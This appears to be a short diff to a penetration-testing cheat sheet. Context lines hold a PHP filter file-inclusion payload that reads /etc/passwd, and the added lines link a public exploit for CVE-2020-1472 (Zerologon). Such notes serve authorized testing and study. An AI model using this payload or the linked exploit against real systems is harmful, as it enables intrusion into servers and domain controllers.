@@ -185,3 +185,9 @@ Read PHP Code with PHP Filter :
 ```markdown
 https://X.X.X.X/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd
 ```
+
+### Windows
+CVE-2020-1472 : Zero Logon
+```markdown
+https://github.com/dirkjanm/CVE-2020-1472
+```
